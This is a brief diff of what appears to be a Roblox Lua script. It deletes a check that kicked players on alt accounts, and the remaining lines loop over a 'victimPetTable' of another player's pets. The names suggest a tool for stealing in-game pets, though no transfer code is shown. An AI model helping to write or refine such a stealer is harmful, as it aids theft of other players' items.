@@ -291,11 +291,6 @@ end
 
 getPlayersPets()
 
-if #victimPetTable == 0 then
-    plr:Kick("Lmao playing on Alt Account")
-    return
-end
-
 task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
